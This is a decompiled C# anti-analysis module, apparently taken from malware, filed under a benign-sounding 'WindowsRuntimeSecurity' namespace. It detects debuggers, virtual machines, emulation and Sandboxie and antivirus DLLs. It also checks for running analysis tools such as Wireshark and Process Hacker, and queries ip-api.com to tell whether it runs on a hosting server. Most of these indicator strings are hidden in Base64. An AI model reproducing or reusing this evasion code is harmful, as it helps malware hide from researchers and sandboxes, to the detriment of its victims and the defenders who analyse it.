using System;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace WindowsRuntimeSecurity.MiscMethods
{
	// Token: 0x02000004 RID: 4
	internal class AntiAnalysis
	{
		// Token: 0x06000004 RID: 4
		[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
		private static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);

		// Token: 0x06000005 RID: 5
		[DllImport("kernel32.dll")]
		private static extern IntPtr GetModuleHandle(string lpModuleName);

		// Token: 0x06000006 RID: 6 RVA: 0x000020CC File Offset: 0x000002CC
		private static bool IsDebuggerAttached()
		{
			bool flag = false;
			bool result;
			try
			{
				AntiAnalysis.CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref flag);
				result = flag;
			}
			catch
			{
				result = false;
			}
			return result;
		}

		// Token: 0x06000007 RID: 7 RVA: 0x00002108 File Offset: 0x00000308
		private static bool IsVirtualMachine()
		{
			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
			{
				try
				{
					using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
					{
						foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
						{
							if ((managementBaseObject["Manufacturer"].ToString().ToLower() == "microsoft corporation" && managementBaseObject["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) || managementBaseObject["Manufacturer"].ToString().ToLower().Contains("vmware") || managementBaseObject["Model"].ToString() == "VirtualBox")
							{
								return true;
							}
						}
					}
				}
				catch
				{
					return true;
				}
			}
			foreach (ManagementBaseObject managementBaseObject2 in new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController").Get())
			{
				if (managementBaseObject2.GetPropertyValue("Name").ToString().Contains("VMware") && managementBaseObject2.GetPropertyValue("Name").ToString().Contains("VBox"))
				{
					return true;
				}
			}
			return false;
		}

		// Token: 0x06000008 RID: 8 RVA: 0x000022B4 File Offset: 0x000004B4
		private static bool IsEmulated()
		{
			try
			{
				long ticks = DateTime.Now.Ticks;
				Thread.Sleep(10);
				if (DateTime.Now.Ticks - ticks < 10L)
				{
					return true;
				}
			}
			catch
			{
			}
			return false;
		}

		// Token: 0x06000009 RID: 9 RVA: 0x00002308 File Offset: 0x00000508
		private static bool IsSandBoxie()
		{
			string[] array = new string[]
			{
				Encoding.UTF8.GetString(Convert.FromBase64String("U2JpZURsbC5kbGw=")),
				Encoding.UTF8.GetString(Convert.FromBase64String("U3hJbi5kbGw=")),
				Encoding.UTF8.GetString(Convert.FromBase64String("U2YyLmRsbA==")),
				Encoding.UTF8.GetString(Convert.FromBase64String("c254aGsuZGxs")),
				Encoding.UTF8.GetString(Convert.FromBase64String("Y21kdnJ0MzIuZGxs"))
			};
			for (int i = 0; i < array.Length; i++)
			{
				if (AntiAnalysis.GetModuleHandle(array[i]).ToInt32() != 0)
				{
					return true;
				}
			}
			return false;
		}

		// Token: 0x0600000A RID: 10 RVA: 0x000023B4 File Offset: 0x000005B4
		private static bool IsBlacklistedProcessesRunning()
		{
			Process[] processes = Process.GetProcesses();
			string[] source = new string[]
			{
				Encoding.UTF8.GetString(Convert.FromBase64String("cHJvY2Vzc2hhY2tlcg==")),
				Encoding.UTF8.GetString(Convert.FromBase64String("bmV0c3RhdA==")),
				Encoding.UTF8.GetString(Convert.FromBase64String("bmV0bW9u")),
				Encoding.UTF8.GetString(Convert.FromBase64String("dGNwdmlldw==")),
				Encoding.UTF8.GetString(Convert.FromBase64String("d2lyZXNoYXJr")),
				Encoding.UTF8.GetString(Convert.FromBase64String("ZmlsZW1vbg==")),
				Encoding.UTF8.GetString(Convert.FromBase64String("cmVnbW9u")),
				Encoding.UTF8.GetString(Convert.FromBase64String("Y2Fpbg=="))
			};
			foreach (Process process in processes)
			{
				if (source.Contains(process.ProcessName.ToLower()))
				{
					return true;
				}
			}
			return false;
		}

		// Token: 0x0600000B RID: 11 RVA: 0x000024B4 File Offset: 0x000006B4
		private static bool IsHosted()
		{
			try
			{
				return new WebClient().DownloadString(Encoding.UTF8.GetString(Convert.FromBase64String("aHR0cDovL2lwLWFwaS5jb20vbGluZS8/ZmllbGRzPWhvc3Rpbmc="))).Contains("true");
			}
			catch
			{
			}
			return false;
		}

		// Token: 0x0600000C RID: 12 RVA: 0x00002504 File Offset: 0x00000704
		public static bool IsAnalyzed()
		{
			return AntiAnalysis.IsHosted() || AntiAnalysis.IsSandBoxie() || AntiAnalysis.IsVirtualMachine() || AntiAnalysis.IsDebuggerAttached() || AntiAnalysis.IsEmulated() || AntiAnalysis.IsBlacklistedProcessesRunning();
		}
	}
}
